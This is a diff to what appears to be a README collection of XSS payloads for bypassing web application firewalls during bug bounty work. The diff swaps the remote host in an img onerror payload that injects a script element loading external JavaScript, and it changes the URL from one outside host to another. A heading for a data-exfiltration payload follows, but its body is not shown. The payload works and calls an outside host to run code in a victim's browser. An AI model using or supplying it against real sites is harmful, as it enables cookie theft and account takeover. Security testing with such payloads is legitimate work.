@@ -6,7 +6,7 @@ Some collection of xss payloads that worked for me to bypass wafs while doing bb
 1. **Inject External JavaScript without `<script>` Tag:**
    
 ```html
-<img src=x onerror="var script = document.createElement('script'); script.src = 'https://eternal.h4ck.me/xss.js'; document.head.appendChild(script);">
+<img src=x onerror="var script = document.createElement('script'); script.src = 'https://basedygt.github.io/xss.js'; document.head.appendChild(script);">
 ```
 
 2. **Data Exfiltration through Image Source (when CSP is disabled):**
